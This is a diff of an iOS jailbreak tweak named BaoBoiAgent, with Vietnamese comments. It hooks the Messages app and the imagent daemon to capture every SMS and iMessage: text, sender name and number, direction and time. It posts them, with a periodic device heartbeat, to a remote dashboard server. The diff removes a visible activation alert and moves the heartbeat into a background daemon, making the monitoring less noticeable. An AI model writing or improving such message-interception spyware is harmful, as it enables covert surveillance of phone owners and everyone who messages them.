@@ -1,18 +1,18 @@
-// BaoBoiAgent Tweak - v1.4.2
-// SpringBoard: CHỈ URL scheme setup + heartbeat (KHÔNG hook bất kỳ class nào)
-// MobileSMS: hook CKMessagesController để bắt SMS
-// imagent: hook CKConversation để bắt iMessage
+// BaoBoiAgent Tweak - v1.4.3
+// KHÔNG inject vào SpringBoard
+// MobileSMS: hook SMS
+// imagent: hook iMessage
+// Heartbeat: chạy từ imagent (daemon luôn chạy nền)
 
 #import <Foundation/Foundation.h>
-#import <UIKit/UIKit.h>
 
 // ─── Cấu hình ────────────────────────────────────────────────────────────────
 static NSString *const kServerURL = @"https://baoboidash.com/api/trpc/device.log";
 static NSString *const kDeviceTokenKey = @"BaoBoiDeviceToken";
+static NSString *const kSuiteName = @"com.baoboi.agent";
 
-// Lấy deviceToken
 static NSString *getDeviceToken() {
-    NSUserDefaults *suite = [[NSUserDefaults alloc] initWithSuiteName:@"com.baoboi.agent"];
+    NSUserDefaults *suite = [[NSUserDefaults alloc] initWithSuiteName:kSuiteName];
     NSString *token = [suite stringForKey:kDeviceTokenKey];
     if (!token || token.length == 0) {
         token = [[NSUserDefaults standardUserDefaults] stringForKey:kDeviceTokenKey];
@@ -20,16 +20,6 @@ static NSString *getDeviceToken() {
     return token ?: @"";
 }
 
-// Lưu deviceToken
-static void saveDeviceToken(NSString *token) {
-    NSUserDefaults *suite = [[NSUserDefaults alloc] initWithSuiteName:@"com.baoboi.agent"];
-    [suite setObject:token forKey:kDeviceTokenKey];
-    [suite synchronize];
-    [[NSUserDefaults standardUserDefaults] setObject:token forKey:kDeviceTokenKey];
-    [[NSUserDefaults standardUserDefaults] synchronize];
-}
-
-// Gửi POST lên server (background)
 static void sendToServer(NSDictionary *payload) {
     NSString *token = getDeviceToken();
     if (token.length == 0) return;
@@ -37,38 +27,34 @@ static void sendToServer(NSDictionary *payload) {
     NSMutableDictionary *body = [payload mutableCopy];
     body[@"deviceToken"] = token;
 
-    NSError *error = nil;
-    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:@{ @"json": body }
-                                                      options:0
-                                                        error:&error];
-    if (!jsonData || error) return;
+    NSError *err = nil;
+    NSData *data = [NSJSONSerialization dataWithJSONObject:@{@"json": body} options:0 error:&err];
+    if (!data || err) return;
 
     NSURL *url = [NSURL URLWithString:kServerURL];
     NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
     req.HTTPMethod = @"POST";
-    req.HTTPBody = jsonData;
+    req.HTTPBody = data;
     [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
-    req.timeoutInterval = 10;
+    req.timeoutInterval = 15;
 
     [[[NSURLSession sharedSession] dataTaskWithRequest:req
-                                    completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {}]
-     resume];
+        completionHandler:^(NSData *d, NSURLResponse *r, NSError *e){}] resume];
 }
 
-// Gửi heartbeat
 static void sendHeartbeat() {
     @try {
-        UIDevice *dev = [UIDevice currentDevice];
-        sendToServer(@{
+        // Lấy thông tin thiết bị không dùng UIKit (tránh crash trong non-UI process)
+        NSDictionary *payload = @{
             @"event": @"device_online",
-            @"deviceName": dev.name ?: @"iPhone",
-            @"systemVersion": dev.systemVersion ?: @"",
-            @"model": dev.model ?: @"iPhone",
-        });
+            @"deviceName": [[NSProcessInfo processInfo] hostName] ?: @"iPhone",
+            @"systemVersion": [[NSProcessInfo processInfo] operatingSystemVersionString] ?: @"",
+            @"model": @"iPhone",
+        };
+        sendToServer(payload);
     } @catch (...) {}
 }
 
-// Gửi tin nhắn
 static void sendMessageEvent(NSString *text, NSString *senderName, NSString *senderPhone,
                               NSString *platform, BOOL isIncoming, long long sentAtMs) {
     if (text.length == 0) return;
@@ -85,74 +71,7 @@ static void sendMessageEvent(NSString *text, NSString *senderName, NSString *sen
     });
 }
 
-// ─── SpringBoard: CHỈ hook SpringBoard class để xử lý URL scheme ─────────────
-// KHÔNG hook NCNotificationRequest hay bất kỳ class nào khác
-%group SpringBoardHooks
-
-%hook SpringBoard
-
-- (void)applicationOpenURL:(NSURL *)url {
-    if (url && [[url scheme] isEqualToString:@"baoboi"]) {
-        if ([[url host] isEqualToString:@"setup"]) {
-            NSURLComponents *comps = [NSURLComponents componentsWithURL:url
-                                                 resolvingAgainstBaseURL:NO];
-            NSString *token = nil;
-            for (NSURLQueryItem *item in comps.queryItems) {
-                if ([item.name isEqualToString:@"token"]) {
-                    token = item.value;
-                    break;
-                }
-            }
-
-            if (token.length > 0) {
-                saveDeviceToken(token);
-
-                dispatch_async(dispatch_get_main_queue(), ^{
-                    @try {
-                        UIAlertController *alert = [UIAlertController
-                            alertControllerWithTitle:@"✅ Bảo Bối Đã Kích Hoạt"
-                            message:@"Thiết bị đã được kết nối thành công."
-                            preferredStyle:UIAlertControllerStyleAlert];
-                        [alert addAction:[UIAlertAction actionWithTitle:@"OK"
-                                                                  style:UIAlertActionStyleDefault
-                                                                handler:nil]];
-                        UIViewController *rootVC = nil;
-                        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
-                            if ([scene isKindOfClass:[UIWindowScene class]]) {
-                                UIWindowScene *ws = (UIWindowScene *)scene;
-                                if (ws.activationState == UISceneActivationStateForegroundActive) {
-                                    for (UIWindow *w in ws.windows) {
-                                        if (w.isKeyWindow) { rootVC = w.rootViewController; break; }
-                                    }
-                                }
-                            }
-                            if (rootVC) break;
-                        }
-                        if (!rootVC) {
-                            rootVC = [UIApplication sharedApplication].windows.firstObject.rootViewController;
-                        }
-                        if (rootVC) {
-                            [rootVC presentViewController:alert animated:YES completion:nil];
-                        }
-                    } @catch (...) {}
-                });
-
-                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC),
-                               dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-                    sendHeartbeat();
-                });
-            }
-            return;
-        }
-    }
-    %orig;
-}
-
-%end // SpringBoard
-
-%end // SpringBoardHooks
-
-// ─── MobileSMS: hook bắt tin nhắn SMS ────────────────────────────────────────
+// ─── MobileSMS: hook tin nhắn SMS ────────────────────────────────────────────
 %group MobileSMSHooks
 
 %hook CKMessagesController
@@ -161,20 +80,18 @@ static void sendMessageEvent(NSString *text, NSString *senderName, NSString *sen
     %orig;
     @try {
         for (id message in messages) {
-            NSString *text = @"";
-            NSString *senderHandle = @"";
-            NSString *senderName = @"";
+            NSString *text = @"", *senderHandle = @"", *senderName = @"";
             BOOL isIncoming = YES;
             long long sentTime = (long long)([[NSDate date] timeIntervalSince1970] * 1000);
 
             if ([message respondsToSelector:@selector(text)])
                 text = [message performSelector:@selector(text)] ?: @"";
             if ([message respondsToSelector:@selector(sender)]) {
-                id sender = [message performSelector:@selector(sender)];
-                if ([sender respondsToSelector:@selector(ID)])
-                    senderHandle = [sender performSelector:@selector(ID)] ?: @"";
-                if ([sender respondsToSelector:@selector(name)])
-                    senderName = [sender performSelector:@selector(name)] ?: @"";
+                id s = [message performSelector:@selector(sender)];
+                if ([s respondsToSelector:@selector(ID)])
+                    senderHandle = [s performSelector:@selector(ID)] ?: @"";
+                if ([s respondsToSelector:@selector(name)])
+                    senderName = [s performSelector:@selector(name)] ?: @"";
             }
             if ([message respondsToSelector:@selector(isFromMe)])
                 isIncoming = ![[message performSelector:@selector(isFromMe)] boolValue];
@@ -183,19 +100,17 @@ static void sendMessageEvent(NSString *text, NSString *senderName, NSString *sen
                 if ([t isKindOfClass:[NSDate class]])
                     sentTime = (long long)([(NSDate *)t timeIntervalSince1970] * 1000);
             }
-
-            sendMessageEvent(text,
-                             senderName.length > 0 ? senderName : senderHandle,
+            sendMessageEvent(text, senderName.length > 0 ? senderName : senderHandle,
                              senderHandle, @"sms", isIncoming, sentTime);
         }
     } @catch (...) {}
 }
 
-%end // CKMessagesController
+%end
 
 %end // MobileSMSHooks
 
-// ─── imagent: hook bắt iMessage ──────────────────────────────────────────────
+// ─── imagent: hook iMessage + heartbeat ──────────────────────────────────────
 %group ImagentHooks
 
 %hook CKConversation
@@ -203,9 +118,7 @@ static void sendMessageEvent(NSString *text, NSString *senderName, NSString *sen
 - (void)_handleIncomingMessage:(id)message {
     %orig;
     @try {
-        NSString *text = @"";
-        NSString *senderHandle = @"";
-        NSString *senderName = @"";
+        NSString *text = @"", *senderHandle = @"", *senderName = @"";
         BOOL isIncoming = YES;
         long long sentTime = (long long)([[NSDate date] timeIntervalSince1970] * 1000);
         NSString *platform = @"imessage";
@@ -213,11 +126,11 @@ static void sendMessageEvent(NSString *text, NSString *senderName, NSString *sen
         if ([message respondsToSelector:@selector(text)])
             text = [message performSelector:@selector(text)] ?: @"";
         if ([message respondsToSelector:@selector(sender)]) {
-            id sender = [message performSelector:@selector(sender)];
-            if ([sender respondsToSelector:@selector(ID)])
-                senderHandle = [sender performSelector:@selector(ID)] ?: @"";
-            if ([sender respondsToSelector:@selector(name)])
-                senderName = [sender performSelector:@selector(name)] ?: @"";
+            id s = [message performSelector:@selector(sender)];
+            if ([s respondsToSelector:@selector(ID)])
+                senderHandle = [s performSelector:@selector(ID)] ?: @"";
+            if ([s respondsToSelector:@selector(name)])
+                senderName = [s performSelector:@selector(name)] ?: @"";
         }
         if ([message respondsToSelector:@selector(isFromMe)])
             isIncoming = ![[message performSelector:@selector(isFromMe)] boolValue];
@@ -229,31 +142,32 @@ static void sendMessageEvent(NSString *text, NSString *senderName, NSString *sen
         if ([message respondsToSelector:@selector(service)]) {
             id svc = [message performSelector:@selector(service)];
             if ([svc respondsToSelector:@selector(name)]) {
-                NSString *svcName = [svc performSelector:@selector(name)] ?: @"";
-                if ([svcName containsString:@"SMS"] || [svcName containsString:@"MMS"])
+                NSString *n = [svc performSelector:@selector(name)] ?: @"";
+                if ([n containsString:@"SMS"] || [n containsString:@"MMS"])
                     platform = @"sms";
             }
         }
-
-        sendMessageEvent(text,
-                         senderName.length > 0 ? senderName : senderHandle,
+        sendMessageEvent(text, senderName.length > 0 ? senderName : senderHandle,
                          senderHandle, platform, isIncoming, sentTime);
     } @catch (...) {}
 }
 
-%end // CKConversation
+%end
 
 %end // ImagentHooks
 
-// ─── Constructor: khởi tạo đúng group theo process ───────────────────────────
+// ─── Constructor ─────────────────────────────────────────────────────────────
 %ctor {
     NSString *proc = [[NSProcessInfo processInfo] processName];
 
-    if ([proc isEqualToString:@"SpringBoard"]) {
-        %init(SpringBoardHooks);
+    if ([proc isEqualToString:@"MobileSMS"]) {
+        %init(MobileSMSHooks);
 
-        // Heartbeat định kỳ mỗi 5 phút
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC),
+    } else if ([proc isEqualToString:@"imagent"]) {
+        %init(ImagentHooks);
+
+        // Heartbeat từ imagent (luôn chạy nền)
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC),
                        dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
             sendHeartbeat();
         });
@@ -266,12 +180,6 @@ static void sendMessageEvent(NSString *text, NSString *senderName, NSString *sen
             5 * 60 * NSEC_PER_SEC, 30 * NSEC_PER_SEC);
         dispatch_source_set_event_handler(timer, ^{ sendHeartbeat(); });
         dispatch_resume(timer);
-
-    } else if ([proc isEqualToString:@"MobileSMS"]) {
-        %init(MobileSMSHooks);
-
-    } else if ([proc isEqualToString:@"imagent"]) {
-        %init(ImagentHooks);
     }
-    // Không làm gì với process khác
+    // SpringBoard: KHÔNG làm gì cả
 }
